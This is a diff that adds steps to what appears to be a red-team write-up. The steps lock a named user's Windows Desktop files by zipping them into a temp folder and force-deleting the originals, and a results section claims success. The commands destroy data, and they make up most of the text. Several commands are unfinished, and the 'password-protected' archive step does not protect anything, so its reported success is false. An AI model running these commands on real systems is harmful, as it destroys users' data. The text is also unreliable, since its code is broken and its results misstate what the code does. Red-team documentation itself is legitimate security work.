@@ -21,3 +21,23 @@ This technique involves encrypting or locking files on a compromised system to d
 
 `cmd
 dir C:\Users\jcruz\Desktop
+
+### 2.Compress and Lock Filescmd
+
+powershell -c "Compress-Archive -Path C:\Users\jcruz\Desktop\* -DestinationPath C:\Windows\Temp\locked_files.zip -F
+
+### 3. Remove Original Files (Impact)cmd
+
+del /f /q C:\Users\jcruz\Desktop\*.*
+
+### 4. Optional – Password Protected Archivecmd
+
+powershell -c "$password = ConvertTo-SecureString 'LockedByRedTeam' -AsPlainText -Force; Compress-Archive -Path C:\Users\jcruz
+
+ResultsStatus: Successful
+Successfully identified and targeted user files on the Desktop.
+Compressed selected files into a locked archive.
+Demonstrated denial of access by removing or relocating original files.
+Created password-protected archive for additional impact.
+
+
